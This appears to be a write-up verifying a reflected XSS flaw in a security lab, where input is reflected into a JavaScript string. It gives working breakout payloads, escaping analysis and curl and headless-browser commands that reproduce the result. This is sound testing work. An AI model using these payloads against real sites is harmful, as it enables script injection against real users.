# Verification — Reflected XSS into JS string (`<>` encoded)

## Methodology
1. Reflection sweep (curl): unique marker → all echoes (HTML body + inline script).
2. Metachar probe with newline + semicolon included (`'"<>\` LF `;`) — read CONTINUATION
   lines too (raw newlines split server lines; grep the region, don't trust one line).
3. Byte-exact escaper proof per location (xxd): distinguishes doubling from raw.
4. Positive proof headlessly with side-effect marker (`document.title=`), `//`-tailed.
5. Negative: `</script>` neutralization.
6. Terminator analysis (which chars CAN end the string here — reasoned + spot-probed).
7. Lab acceptance: real-browser `alert(1)`; banner polls.

## Evidence

### 1. Reflections (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>
var searchTerms = 'reconprobe';
(document.write tracker follows, consuming searchTerms via encodeURIComponent)
```

### 2. Encoding map — metachar probe `ENC'"<>\` LF `;` (curl)
```
h1    : 'ENC&apos;&quot;&lt;&gt;\\  LF  ;'</h1>     (quotes+brackets encoded; \ doubled)
script: var searchTerms = 'ENC'"&lt;&gt;\  LF  ;';  (only <> encoded; '"\ raw)
```
Key subtlety caught only by reading continuation lines: the raw LF splits the
response — line-grep alone truncates the evidence.

### 3. Byte-exact escaper proof (xxd, input `BS\END`)
```
h1    : …'BS 5c 5c END'…     (backslash DOUBLED)
script: …'BS 5c END'…        (backslash RAW, single)
```
Two locations, two escapers — verified at byte level, not inferred.

### 4. Positive execution proof (headless dump-dom)
```
?search=%27%3Bdocument.title%3D%27JSMARK%27%3B%2F%2F
→ <title>JSMARK</title>
→ rendered: var searchTerms = '';document.title='JSMARK';//';
```
Clean breakout line; no throw (tail commented); tracker line intact below.

### 5. Negative proof
```
?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E
→ &lt;script&gt; in the script block (entities — inert)
```

### 6. Terminator analysis for this sink
| Candidate terminator | Verdict | Basis |
|---|---|---|
| `'` | WORKS (used) | raw; matches delimiter |
| `"` | inert | content inside `'…'` |
| `\` (trailing) | would throw | escapes template `'` → string spans newline → illegal |
| raw newline | breaks (no execution) | unterminated-literal error before any statement completes |
| `</script>` | encoded dead | `&lt;` |

### 7. Lab acceptance
Real browser → `?search=%27%3Balert(1)%3B%2F%2F` → `alert(1)` during parse →
`is-solved` (first poll).

## Reproducibility
```
BASE=…
curl -s "$BASE/?search=ENC%27%22%3C%3E%5C%0A%3B" | sed -n '/search results for/,+1p;/searchTerms = /,+1p'
curl -s "$BASE/?search=BS%5CEND" | grep "searchTerms = " | xxd | tail -2
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%27%3Bdocument.title%3D%27JSMARK%27%3B%2F%2F" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: dual reflections, per-location byte-exact escapers, quote-breakout
  execution (title side-effect), `</script>` neutralization, real-browser acceptance.
- Reasoned-structural (spec-axiomatic): `"`/newline/`\` non-viability as terminators
  here, recorded with mechanisms.